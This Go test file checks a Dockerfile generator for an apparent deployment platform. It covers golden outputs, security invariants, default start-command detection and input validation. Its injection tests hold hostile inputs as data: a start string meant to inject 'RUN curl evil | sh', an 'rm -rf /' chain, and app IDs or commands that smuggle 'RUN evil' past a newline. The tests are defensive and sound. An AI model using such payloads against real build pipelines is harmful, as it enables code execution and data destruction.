package build

import (
	"encoding/json"
	"errors"
	"flag"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

var update = flag.Bool("update", false, "rewrite golden Dockerfiles in testdata/")

const testAppID = "0b5f0b4e-6f1a-4c8e-9d7a-2f3e4d5c6b7a"

var variants = []struct {
	name  string
	rt    Runtime
	start string
	src   Source
}{
	{"python-requirements", Python, "uvicorn main:app --host 0.0.0.0 --port $PORT", Source{Paths: []string{"main.py", "requirements.txt"}}},
	{"python-pyproject", Python, "python app.py", Source{Paths: []string{"app.py", "pyproject.toml"}}},
	{"node-lockfile", Node, "npm start", Source{Paths: []string{"package.json", "package-lock.json", "index.js"}}},
	{"node-no-lockfile", Node, "node server.js", Source{Paths: []string{"package.json", "server.js"}}},
	{"static", Static, "", Source{Paths: []string{"index.html"}}},
}

func TestDockerfileGolden(t *testing.T) {
	for _, v := range variants {
		t.Run(v.name, func(t *testing.T) {
			got, err := Dockerfile(v.rt, v.start, v.src, testAppID)
			if err != nil {
				t.Fatalf("Dockerfile: %v", err)
			}
			golden := filepath.Join("testdata", v.name+".Dockerfile")
			if *update {
				if err := os.WriteFile(golden, got, 0o644); err != nil {
					t.Fatal(err)
				}
			}
			want, err := os.ReadFile(golden)
			if err != nil {
				t.Fatalf("read golden (run go test ./internal/build -run TestDockerfileGolden -update): %v", err)
			}
			if string(got) != string(want) {
				t.Fatalf("Dockerfile differs from %s:\n--- got ---\n%s\n--- want ---\n%s", golden, got, want)
			}
		})
	}
}

// Security invariants that must hold for every template (ADR 004, ARCHITECTURE §9-10).
func TestDockerfileInvariants(t *testing.T) {
	for _, v := range variants {
		t.Run(v.name, func(t *testing.T) {
			df, err := Dockerfile(v.rt, v.start, v.src, testAppID)
			if err != nil {
				t.Fatalf("Dockerfile: %v", err)
			}
			var instr []string
			for _, line := range strings.Split(string(df), "\n") {
				if f := strings.Fields(line); len(f) > 0 && !strings.HasPrefix(f[0], "#") && !strings.HasPrefix(line, " ") {
					instr = append(instr, line)
				}
			}
			user, cmds := "", 0
			for _, line := range instr {
				switch op := strings.Fields(line)[0]; op {
				case "USER":
					user = strings.TrimPrefix(line, "USER ")
				case "RUN", "COPY":
					// Anything that touches user files, or runs after them, runs as the app user.
					if strings.Contains(line, SourceDir+"/") && user != "10001:10001" {
						t.Errorf("%q runs as %q, want 10001:10001", line, user)
					}
					if op == "RUN" && user != "" && user != "10001:10001" {
						t.Errorf("RUN after switching away from the app user: %q", line)
					}
				case "CMD":
					cmds++
				case "LABEL":
					if line != "LABEL shipyard.app_id="+testAppID {
						t.Errorf("unexpected label %q", line)
					}
				case "FROM", "ENV", "WORKDIR", "EXPOSE":
				default:
					t.Errorf("unexpected instruction %q", line)
				}
			}
			if user != "10001:10001" {
				t.Errorf("final USER = %q, want 10001:10001", user)
			}
			if cmds != 1 {
				t.Errorf("%d CMD instructions, want 1", cmds)
			}
			lines := strings.Split(string(df), "\n")
			// A first-line "# key=value" would be a BuildKit parser directive (syntax=, escape=, check=).
			if first := lines[0]; strings.HasPrefix(first, "#") && strings.Contains(first, "=") {
				t.Errorf("first line looks like a parser directive: %q", first)
			}
			setuidStripped, userSet := false, false
			for _, line := range lines {
				if strings.HasPrefix(line, "FROM ") && !strings.Contains(line, "@sha256:") {
					t.Errorf("base image not pinned by digest: %q", line)
				}
				if strings.Contains(line, "-perm /6000") && strings.Contains(line, "chmod a-s") && !userSet {
					setuidStripped = true
				}
				if strings.HasPrefix(line, "USER ") {
					userSet = true
				}
			}
			if !setuidStripped {
				t.Error("setuid/setgid bits are not stripped before USER")
			}
			if !strings.Contains(string(df), "ENV SHIPYARD_APP_ID="+testAppID) {
				t.Error("missing per-app cache key")
			}
			if v.rt == Static && strings.Contains(string(df), "COPY --chown") {
				t.Error("static files must stay root-owned")
			}
			for _, want := range []string{"EXPOSE 8080", "PORT=8080", "HOME=/tmp"} {
				if !strings.Contains(string(df), want) {
					t.Errorf("missing %q", want)
				}
			}
			if strings.Contains(string(df), "COPY . ") || strings.Contains(string(df), "ADD ") {
				t.Error("template copies the whole build context or uses ADD; only src/ may be copied")
			}
		})
	}
}

// The start command is attacker-controlled. Whatever it contains, it must end
// up as exactly one argument of the single exec-form CMD.
func TestDockerfileStartCannotInject(t *testing.T) {
	starts := []string{
		`python app.py`,
		`python app.py"]`,
		`"] RUN curl evil | sh #`,
		`echo \"$PORT\" \\ && rm -rf /`,
		`python -c 'print("hi")'`,
		"echo $(id) `id` ${HOME}",
		`<script>&amp;</script>`,
		"café ☕",
	}
	for _, start := range starts {
		t.Run(start, func(t *testing.T) {
			df, err := Dockerfile(Python, start, Source{Paths: []string{"requirements.txt"}}, testAppID)
			if err != nil {
				t.Fatalf("Dockerfile: %v", err)
			}
			var cmdLines []string
			for _, line := range strings.Split(string(df), "\n") {
				if strings.HasPrefix(line, "CMD ") {
					cmdLines = append(cmdLines, line)
				}
				if strings.HasPrefix(line, "RUN curl") {
					t.Fatalf("injected instruction: %q", line)
				}
			}
			if len(cmdLines) != 1 {
				t.Fatalf("got %d CMD lines", len(cmdLines))
			}
			var argv []string
			if err := json.Unmarshal([]byte(strings.TrimPrefix(cmdLines[0], "CMD ")), &argv); err != nil {
				t.Fatalf("CMD is not a JSON array: %v (%s)", err, cmdLines[0])
			}
			if len(argv) != 3 || argv[0] != "/bin/sh" || argv[1] != "-c" || argv[2] != "exec "+start {
				t.Fatalf("CMD argv = %q", argv)
			}
		})
	}
}

func TestDockerfileErrors(t *testing.T) {
	tests := []struct {
		name  string
		rt    Runtime
		start string
		src   Source
		appID string
	}{
		{"bad app id", Python, "python app.py", Source{Paths: []string{"requirements.txt"}}, "not-a-uuid"},
		{"app id with injection", Static, "", Source{Paths: []string{"index.html"}}, testAppID + "\nRUN evil"},
		{"start with C1 control (NEL)", Python, "python app.py\u0085RUN evil", Source{Paths: []string{"requirements.txt"}}, ""},
		{"start with invalid UTF-8", Python, "python \xff app.py", Source{Paths: []string{"requirements.txt"}}, ""},
		{"python without deps file", Python, "python app.py", Source{Paths: []string{"app.py"}}, ""},
		{"node without package.json", Node, "node x.js", Source{Paths: []string{"x.js"}}, ""},
		{"python without start", Python, "", Source{Paths: []string{"requirements.txt"}}, ""},
		{"blank start", Node, "  ", Source{Paths: []string{"package.json"}}, ""},
		{"start with newline", Python, "python app.py\nRUN evil", Source{Paths: []string{"requirements.txt"}}, ""},
		{"static with start", Static, "python -m http.server", Source{Paths: []string{"index.html"}}, ""},
		{"unknown runtime", Runtime("ruby"), "ruby app.rb", Source{}, ""},
		{"template name traversal", Runtime("../evil"), "x", Source{}, ""},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if tt.appID == "" {
				tt.appID = testAppID
			}
			if df, err := Dockerfile(tt.rt, tt.start, tt.src, tt.appID); err == nil {
				t.Fatalf("expected an error, got Dockerfile:\n%s", df)
			}
		})
	}
}

func TestDefaultStart(t *testing.T) {
	tests := []struct {
		name string
		rt   Runtime
		src  Source
		want string
		err  error
	}{
		{"node", Node, Source{Paths: []string{"package.json"}}, "npm start", nil},
		{"static", Static, Source{Paths: []string{"index.html"}}, "", nil},
		{"fastapi main.py", Python, Source{Paths: []string{"main.py", "requirements.txt"}, Requirements: []byte("fastapi==0.115\nuvicorn\n")},
			"uvicorn main:app --host 0.0.0.0 --port $PORT", nil},
		{"fastapi app.py", Python, Source{Paths: []string{"app.py", "requirements.txt"}, Requirements: []byte("FastAPI[standard]>=0.110")},
			"uvicorn app:app --host 0.0.0.0 --port $PORT", nil},
		{"flask", Python, Source{Paths: []string{"app.py", "requirements.txt"}, Requirements: []byte("# web\nFlask>=3\ngunicorn\n")},
			"flask --app app run --no-debugger --no-reload --host 0.0.0.0 --port $PORT", nil},
		{"streamlit", Python, Source{Paths: []string{"streamlit_app.py", "app.py", "requirements.txt"}, Requirements: []byte("streamlit\npandas\n")},
			"streamlit run streamlit_app.py --server.port $PORT --server.address 0.0.0.0 --server.headless true", nil},
		{"streamlit wins over fastapi", Python, Source{Paths: []string{"app.py"}, Requirements: []byte("fastapi\nstreamlit\n")},
			"streamlit run app.py --server.port $PORT --server.address 0.0.0.0 --server.headless true", nil},
		{"pyproject dependencies", Python, Source{Paths: []string{"main.py", "pyproject.toml"}, PyProject: []byte("[project]\nname = \"x\"\ndependencies = [\"fastapi>=0.110\", \"uvicorn[standard]\"]\n")},
			"uvicorn main:app --host 0.0.0.0 --port $PORT", nil},
		{"plain python app.py", Python, Source{Paths: []string{"app.py", "requirements.txt"}, Requirements: []byte("requests\n")}, "python app.py", nil},
		{"plain python main.py", Python, Source{Paths: []string{"main.py", "requirements.txt"}}, "python main.py", nil},
		{"framework but no entry file", Python, Source{Paths: []string{"server.py", "requirements.txt"}, Requirements: []byte("flask")}, "", ErrNoStart},
		{"no entry file", Python, Source{Paths: []string{"src/pkg/__init__.py", "pyproject.toml"}}, "", ErrNoStart},
		{"options and comments ignored", Python, Source{Paths: []string{"app.py"}, Requirements: []byte("-r base.txt\n--index-url https://x\n  # flask\n")}, "python app.py", nil},
		{"oversized requirements ignored", Python, Source{Paths: []string{"app.py"}, Requirements: []byte("flask\n" + strings.Repeat("#", 70<<10))}, "python app.py", nil},
		{"deeply nested pyproject ignored", Python, Source{Paths: []string{"app.py", "pyproject.toml"}, PyProject: []byte(strings.Repeat("[", 1<<20))}, "python app.py", nil},
		{"node with start script", Node, Source{Paths: []string{"package.json"}, PackageJSON: []byte(`{"scripts":{"start":"node x.js"}}`)}, "npm start", nil},
		{"node with server.js and no start script", Node, Source{Paths: []string{"package.json", "server.js"}, PackageJSON: []byte(`{"name":"x"}`)}, "npm start", nil},
		{"node without package.json details", Node, Source{Paths: []string{"package.json"}}, "npm start", nil},
		{"vite react project", Node, Source{Paths: []string{"package.json", "index.html", "src/main.jsx"}, PackageJSON: []byte(`{"scripts":{"dev":"vite","build":"vite build","preview":"vite preview"}}`)}, "", ErrFrontendProject},
		{"build script but also a start script", Node, Source{Paths: []string{"package.json"}, PackageJSON: []byte(`{"scripts":{"build":"tsc","start":"node dist/index.js"}}`)}, "npm start", nil},
		{"node with nothing to run", Node, Source{Paths: []string{"package.json"}, PackageJSON: []byte(`{"scripts":{"test":"jest"}}`)}, "", ErrNoNodeStart},
		{"unreadable package.json is not judged", Node, Source{Paths: []string{"package.json"}, PackageJSON: []byte(`{not json`)}, "npm start", nil},
		{"oversized package.json is not judged", Node, Source{Paths: []string{"package.json"}, PackageJSON: []byte(`{"scripts":{"build":"x"},"pad":"` + strings.Repeat("a", 70<<10) + `"}`)}, "npm start", nil},
		{"malformed pyproject ignored", Python, Source{Paths: []string{"app.py", "pyproject.toml"}, PyProject: []byte("[[[")}, "python app.py", nil},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := DefaultStart(tt.rt, tt.src)
			if !errors.Is(err, tt.err) || got != tt.want {
				t.Fatalf("DefaultStart = %q, %v; want %q, %v", got, err, tt.want, tt.err)
			}
		})
	}
}
